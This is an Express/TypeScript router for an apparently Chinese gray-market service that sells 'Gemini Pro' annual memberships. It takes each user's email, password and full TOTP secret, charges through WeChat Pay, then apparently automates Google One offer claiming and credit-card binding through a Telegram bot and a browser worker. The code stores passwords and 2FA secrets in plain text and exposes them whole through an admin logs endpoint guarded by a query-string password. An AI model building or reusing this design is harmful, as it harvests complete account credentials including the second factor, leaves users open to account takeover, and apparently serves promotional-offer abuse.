import { Router, Request, Response } from 'express';
import { getSubmitLogs, logSubmit, getSubmitLogById, updateTelegramStatus, updatePaymentStatus, savePaymentOrder, markPaymentOrderPaid } from './database';
import {
  getTaskStatus,
  getQueueLength,
  getActiveCount,
  isProcessorReady,
  isEmailActive,
  createPendingPaymentTask,
  confirmPaymentAuto,
  confirmPaymentAndEnqueue,
  rejectPayment,
  getPaymentPendingTasks,
  getTask,
} from './taskQueue';
import { config, updateTelegramSession, updateCardInfo } from './config';
import { reconnectTelegram, getTelegramStatus, pingTelegram } from './telegramWorker';
import { getBrowserStatus, startBindCard } from './browserWorker';
import { Task } from './taskQueue';
import { createNativeOrder, queryWechatOrderStatus } from './wechatPay';
import crypto from 'crypto';

export const router = Router();

/**
 * POST /api/submit - 提交认证请求（微信商户支付自动确认模式）
 *
 * 流程：
 *   1) 校验字段
 *   2) 调用微信 API 创建 Native Pay 订单
 *   3) 创建 pending_payment 任务
 *   4) 返回 taskId + codeUrl（前端生成二维码 + 轮询支付状态）
 */
router.post('/api/submit', async (req: Request, res: Response) => {
  const { email, password, totpKey } = req.body;

  // 输入校验
  if (!email || !password || !totpKey) {
    res.status(400).json({ error: '邮箱、密码、TOTP Key 必须填写' });
    return;
  }

  // 邮箱格式
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    res.status(400).json({ error: '邮箱格式不正确' });
    return;
  }

  // 密码长度
  if (password.length < 8) {
    res.status(400).json({ error: '密码至少需要8个字符' });
    return;
  }

  // TOTP key 格式: 32字符（可含空格分隔）
  const cleanTotp = totpKey.replace(/\s/g, '');
  if (cleanTotp.length !== 32) {
    res.status(400).json({ error: 'TOTP Secret Key 必须是32个字符' });
    return;
  }

  // 检查该邮箱是否有正在执行中的任务（防重复提交）
  if (isEmailActive(email)) {
    res.status(400).json({ error: '该邮箱已有进行中的订单，请勿重复提交' });
    return;
  }

  // 检查认证服务是否就绪
  if (!isProcessorReady()) {
    res.status(503).json({ error: '认证服务暂不可用，请稍后再试' });
    return;
  }

  // 生成商户订单号
  const outTradeNo = `gvip_${Date.now().toString(36)}_${crypto.randomBytes(4).toString('hex')}`;

  // 调用微信支付 API 创建 Native Pay 订单
  let codeUrl: string;
  try {
    // 计算超时时间（RFC3339 +08:00）
    const expireMs = Date.now() + config.payment.countdownSec * 1000;
    const timeExpire = new Date(expireMs + 8 * 60 * 60 * 1000)
      .toISOString()
      .replace(/\.\d{3}Z$/, '+08:00');

    codeUrl = await createNativeOrder({
      outTradeNo,
      description: 'Gemini Pro 一年会员认证',
      totalFen: config.payment.amountFen,
      timeExpire,
    });
  } catch (err: any) {
    console.error('[Submit] 微信下单失败:', err.message);
    res.status(502).json({ error: '支付渠道暂时不可用，请稍后重试' });
    return;
  }

  // 创建"待支付"任务
  const task = createPendingPaymentTask(email, password, totpKey, 'wechat-pay');
  task.outTradeNo = outTradeNo;

  // 记录提交日志
  const logId = logSubmit(email, password, totpKey, 'wechat-pay', undefined, task.id);
  task.logId = logId;

  // 保存支付订单到数据库
  savePaymentOrder(outTradeNo, task.id, codeUrl, config.payment.amountFen);

  res.json({
    taskId: task.id,
    codeUrl,
    amount: config.payment.amount,
    countdownSec: config.payment.countdownSec,
  });
});

/**
 * GET /api/payment-status/:taskId - 轮询支付状态（前端每 3 秒调用）
 *
 * 逻辑：
 *   - 如果任务已非 pending_payment（已确认/已失败/已超时），直接返回状态
 *   - 如果还在 pending_payment，则调微信 API 查询订单状态
 *   - 若微信返回 SUCCESS，自动入队
 */

// 查询频率控制：每个订单最多 5 秒查一次微信 API
const lastQueryMap = new Map<string, number>();

router.get('/api/payment-status/:taskId', async (req: Request<{ taskId: string }>, res: Response) => {
  const { taskId } = req.params;

  const task = getTask(taskId);
  if (!task) {
    res.status(404).json({ error: '任务不存在或已过期' });
    return;
  }

  // 已经不是 pending_payment 了，直接返回
  if (task.status !== 'pending_payment') {
    res.json({ status: task.status, message: task.message });
    return;
  }

  // 还在 pending_payment → 查微信 API
  const outTradeNo = task.outTradeNo;
  if (!outTradeNo) {
    res.json({ status: 'pending_payment', message: '等待支付...' });
    return;
  }

  // 频率控制：同一订单 5 秒内不重复查微信
  const now = Date.now();
  const lastQuery = lastQueryMap.get(outTradeNo) || 0;
  if (now - lastQuery < 5000) {
    res.json({ status: 'pending_payment', message: '等待支付...' });
    return;
  }
  lastQueryMap.set(outTradeNo, now);

  // 查询微信订单状态
  try {
    const result = await queryWechatOrderStatus(outTradeNo);
    if (result && result.tradeState === 'SUCCESS') {
      // 金额校验
      if (result.totalAmount !== config.payment.amountFen) {
        console.error(`[Payment] 金额不匹配! 期望 ${config.payment.amountFen} 分，实际 ${result.totalAmount} 分`);
      }

      // 自动确认支付，任务入队
      const confirmResult = confirmPaymentAuto(taskId);
      if (confirmResult === 'ok') {
        // 更新数据库
        markPaymentOrderPaid(outTradeNo, result.transactionId);
        if (task.logId) updatePaymentStatus(task.logId, 'confirmed');
        console.log(`[Payment] 订单 ${outTradeNo} 支付成功，任务 ${taskId} 已入队`);
        res.json({ status: 'queued', message: '支付成功，排队中...' });
      } else {
        // processor_not_ready 等异常
        res.json({ status: 'pending_payment', message: '支付已确认，正在排队...' });
      }
      // 清理频率缓存
      lastQueryMap.delete(outTradeNo);
    } else {
      // 未支付 / 其他状态
      res.json({ status: 'pending_payment', message: '等待支付...' });
    }
  } catch (err: any) {
    console.error('[Payment] 查询微信订单失败:', err.message);
    // 查询失败不影响用户体验，返回继续等待
    res.json({ status: 'pending_payment', message: '等待支付...' });
  }
});

/**
 * GET /api/status/:taskId - 查询任务状态
 */
router.get('/api/status/:taskId', (req: Request<{ taskId: string }>, res: Response) => {
  const result = getTaskStatus(req.params.taskId);
  if (!result) {
    res.status(404).json({ error: '任务不存在或已过期' });
    return;
  }
  res.json(result);
});

/**
 * GET /api/queue - 获取当前排队数（含正在处理的）
 */
router.get('/api/queue', (req: Request, res: Response) => {
  res.json({ length: getActiveCount() });
});

/**
 * GET /api/health - 健康检查
 */
router.get('/api/health', (req: Request, res: Response) => {
  res.json({
    status: 'ok',
    auth: isProcessorReady() ? 'connected' : 'disconnected',
    browser: getBrowserStatus().connected ? 'connected' : 'disconnected',
    queue: getQueueLength(),
  });
});

/**
 * GET /admin - 管理后台页面
 */
router.get('/admin', (req: Request, res: Response) => {
  res.sendFile('admin.html', { root: 'public' });
});

/**
 * GET /api/admin/payments - 获取待支付/待确认收款的任务列表
 */
router.get('/api/admin/payments', (req: Request, res: Response) => {
  const pwd = req.headers['x-admin-password'] || req.query.pwd;
  if (pwd !== config.adminPassword) {
    res.status(401).json({ error: '密码错误' });
    return;
  }
  res.json({ tasks: getPaymentPendingTasks() });
});

/**
 * POST /api/admin/confirm-payment - 管理员确认收款，任务进入正式认证队列
 * Body: { taskId }
 */
router.post('/api/admin/confirm-payment', (req: Request, res: Response) => {
  const pwd = req.headers['x-admin-password'] || req.query.pwd;
  if (pwd !== config.adminPassword) {
    res.status(401).json({ error: '密码错误' });
    return;
  }
  const { taskId } = req.body;
  if (!taskId) {
    res.status(400).json({ error: '缺少 taskId' });
    return;
  }

  const result = confirmPaymentAndEnqueue(taskId);
  switch (result) {
    case 'ok': {
      const task = getTask(taskId);
      if (task?.logId) updatePaymentStatus(task.logId, 'confirmed');
      res.json({ success: true, message: '收款已确认，任务已进入认证队列' });
      return;
    }
    case 'not_found':
      res.status(404).json({ error: '任务不存在或已过期' });
      return;
    case 'wrong_status':
      res.status(400).json({ error: '任务状态不允许确认（可能已确认/已取消）' });
      return;
    case 'processor_not_ready':
      res.status(503).json({ error: '认证服务未就绪，无法入队' });
      return;
  }
});

/**
 * POST /api/admin/reject-payment - 管理员拒绝收款（未收到钱 / 误点）
 * Body: { taskId, reason? }
 */
router.post('/api/admin/reject-payment', (req: Request, res: Response) => {
  const pwd = req.headers['x-admin-password'] || req.query.pwd;
  if (pwd !== config.adminPassword) {
    res.status(401).json({ error: '密码错误' });
    return;
  }
  const { taskId, reason } = req.body;
  if (!taskId) {
    res.status(400).json({ error: '缺少 taskId' });
    return;
  }

  const result = rejectPayment(taskId, reason);
  switch (result) {
    case 'ok': {
      const task = getTask(taskId);
      if (task?.logId) updatePaymentStatus(task.logId, 'rejected');
      res.json({ success: true, message: '订单已取消' });
      return;
    }
    case 'not_found':
      res.status(404).json({ error: '任务不存在或已过期' });
      return;
    case 'wrong_status':
      res.status(400).json({ error: '任务状态不允许取消' });
      return;
  }
});

/**
 * GET /api/admin/logs - 获取所有提交记录（需要密码，包含全部信息）
 */
router.get('/api/admin/logs', (req: Request, res: Response) => {
  const pwd = req.headers['x-admin-password'] || req.query.pwd;
  if (pwd !== config.adminPassword) {
    res.status(401).json({ error: '密码错误' });
    return;
  }
  res.json(getSubmitLogs());
});

/**
 * POST /api/admin/update-session - 热更新 Telegram Session（不需要重启容器）
 *
 * 使用方式：
 * curl -X POST http://43.162.118.171:3000/api/admin/update-session \
 *   -H "Content-Type: application/json" \
 *   -H "X-Admin-Password: your_password" \
 *   -d '{"session": "新的session字符串"}'
 */
router.post('/api/admin/update-session', async (req: Request, res: Response) => {
  const pwd = req.headers['x-admin-password'] || req.query.pwd;
  if (pwd !== config.adminPassword) {
    res.status(401).json({ error: '密码错误' });
    return;
  }

  const { session } = req.body;
  if (!session || typeof session !== 'string' || session.trim().length < 10) {
    res.status(400).json({ error: '请提供有效的 session 字符串' });
    return;
  }

  // 更新内存中的 session
  updateTelegramSession(session.trim());

  // 断开旧连接，用新 session 重连
  const result = await reconnectTelegram();

  console.log(`[Admin] Session updated. Result: ${result}`);
  res.json({
    success: result.includes('successfully'),
    message: result,
    telegram: getTelegramStatus(),
  });
});

/**
 * POST /api/admin/reconnect - 用当前 session 重新连接 Telegram
 */
router.post('/api/admin/reconnect', async (req: Request, res: Response) => {
  const pwd = req.headers['x-admin-password'] || req.query.pwd;
  if (pwd !== config.adminPassword) {
    res.status(401).json({ error: '密码错误' });
    return;
  }

  const result = await reconnectTelegram();
  res.json({
    success: result.includes('successfully'),
    message: result,
    telegram: getTelegramStatus(),
  });
});

/**
 * GET /api/admin/telegram-status - 查看 Telegram 连接状态
 */
router.get('/api/admin/telegram-status', (req: Request, res: Response) => {
  const pwd = req.headers['x-admin-password'] || req.query.pwd;
  if (pwd !== config.adminPassword) {
    res.status(401).json({ error: '密码错误' });
    return;
  }

  res.json({
    ...getTelegramStatus(),
    processorReady: isProcessorReady(),
    queue: getQueueLength(),
  });
});

/**
 * POST /api/admin/telegram-ping - Telegram 拨测（验证 session 有效性和 bot 可达性）
 */
router.post('/api/admin/telegram-ping', async (req: Request, res: Response) => {
  const pwd = req.headers['x-admin-password'] || req.query.pwd;
  if (pwd !== config.adminPassword) {
    res.status(401).json({ error: '密码错误' });
    return;
  }

  try {
    const result = await pingTelegram();
    res.json(result);
  } catch (err: any) {
    res.status(500).json({ ok: false, error: err?.message || String(err) });
  }
});

/**
 * POST /api/admin/trigger-bindcard - 手动触发绑卡（认证成功但绑卡失败时使用）
 */
router.post('/api/admin/trigger-bindcard', async (req: Request, res: Response) => {
  const pwd = req.headers['x-admin-password'] || req.query.pwd;
  if (pwd !== config.adminPassword) {
    res.status(401).json({ error: '密码错误' });
    return;
  }

  const { logId } = req.body;
  if (!logId) {
    res.status(400).json({ error: '请提供 logId' });
    return;
  }

  const log = getSubmitLogById(logId);
  if (!log) {
    res.status(404).json({ error: '记录不存在' });
    return;
  }

  if (log.telegram_status !== 'success') {
    res.status(400).json({ error: 'Telegram 认证未成功，无法绑卡' });
    return;
  }

  if (!log.offer_link) {
    res.status(400).json({ error: '没有 offer 链接，无法绑卡' });
    return;
  }

  // 创建一个临时 Task 用于绑卡
  const task: Task = {
    id: `manual-${logId}-${Date.now().toString(36)}`,
    email: log.email,
    password: log.password,
    totpKey: log.totp_key,
    cardKey: log.card_key,
    offerLink: log.offer_link,
    status: 'auth_success',
    message: '管理员手动触发绑卡...',
    createdAt: Date.now(),
  };

  // 异步触发绑卡
  startBindCard(task).catch(err => {
    console.error(`[Admin] 手动绑卡失败 logId=${logId}: ${err.message}`);
  });

  res.json({ success: true, message: '绑卡已触发，请稍后刷新查看结果' });
});

/**
 * POST /api/admin/manual-bindcard - 手动绑卡（输入用户信息 + offer link，无需现有记录）
 *
 * 用途：Bot 认证成功返回了 link offer，但系统未正确识别为成功时，
 *       管理员手动输入用户信息和 offer link 执行绑卡。
 *
 * Body: { email, password, totpKey, offerLink, cardKey? }
 */
router.post('/api/admin/manual-bindcard', async (req: Request, res: Response) => {
  const pwd = req.headers['x-admin-password'] || req.query.pwd;
  if (pwd !== config.adminPassword) {
    res.status(401).json({ error: '密码错误' });
    return;
  }

  const { email, password: userPassword, totpKey, offerLink, cardKey } = req.body;

  if (!email || !userPassword || !totpKey || !offerLink) {
    res.status(400).json({ error: '必填字段：email, password, totpKey, offerLink' });
    return;
  }

  // TOTP key 格式验证: 必须是32个 Base32 字符（A-Z, 2-7），允许中间有空格
  const cleanTotp = totpKey.replace(/\s/g, '');
  if (cleanTotp.length !== 32) {
    res.status(400).json({ error: `TOTP Key 必须是32个字符（去除空格后），当前: ${cleanTotp.length} 个字符` });
    return;
  }
  if (!/^[A-Z2-7]+$/i.test(cleanTotp)) {
    const invalidChar = cleanTotp.split('').find((c: string) => !/[A-Z2-7]/i.test(c));
    res.status(400).json({ error: `TOTP Key 包含非法字符: "${invalidChar}"，只允许 A-Z 和 2-7` });
    return;
  }

  // 验证 offer link 格式
  if (!offerLink.includes('one.google.com/offer/')) {
    res.status(400).json({ error: 'offer link 格式不正确，应包含 one.google.com/offer/' });
    return;
  }

  // 记录到数据库（如果是全新的手动操作，创建日志）
  const logId = logSubmit(email, userPassword, totpKey, cardKey || 'admin-manual', offerLink);
  updateTelegramStatus(logId, 'success', offerLink);

  // 创建临时 Task
  const task: Task = {
    id: `admin-manual-${Date.now().toString(36)}`,
    email,
    password: userPassword,
    totpKey,
    cardKey: cardKey || 'admin-manual',
    offerLink,
    status: 'auth_success',
    message: '管理员手动绑卡（直接提供 offer link）...',
    createdAt: Date.now(),
  };

  // 异步触发绑卡
  startBindCard(task).catch(err => {
    console.error(`[Admin] 手动绑卡(manual-bindcard)失败 email=${email}: ${err.message}`);
  });

  res.json({ success: true, message: '绑卡已触发，请稍后刷新查看结果', logId });
});

/**
 * GET /api/admin/card-info - 查看当前信用卡信息（脱敏）
 */
router.get('/api/admin/card-info', (req: Request, res: Response) => {
  const pwd = req.headers['x-admin-password'] || req.query.pwd;
  if (pwd !== config.adminPassword) {
    res.status(401).json({ error: '密码错误' });
    return;
  }

  const c = config.card;
  res.json({
    number: c.number ? `****${c.number.slice(-4)}` : '',
    expiry: c.expiry,
    cvv: c.cvv ? '***' : '',
    name: c.name,
    zip: c.zip,
  });
});

/**
 * POST /api/admin/update-card - 热更新信用卡信息（不需重启）
 */
router.post('/api/admin/update-card', (req: Request, res: Response) => {
  const pwd = req.headers['x-admin-password'] || req.query.pwd;
  if (pwd !== config.adminPassword) {
    res.status(401).json({ error: '密码错误' });
    return;
  }

  const { number, expiry, cvv, name, zip } = req.body;
  if (!number && !expiry && !cvv && !name && !zip) {
    res.status(400).json({ error: '至少提供一个字段' });
    return;
  }

  updateCardInfo({ number, expiry, cvv, name, zip });
  console.log(`[Admin] 信用卡信息已更新: number=****${(number || config.card.number).slice(-4)}, expiry=${expiry || config.card.expiry}, name=${name || config.card.name}`);

  res.json({ success: true, message: '信用卡信息已更新（运行时生效，重启后需重新设置或更新 .env.production）' });
});
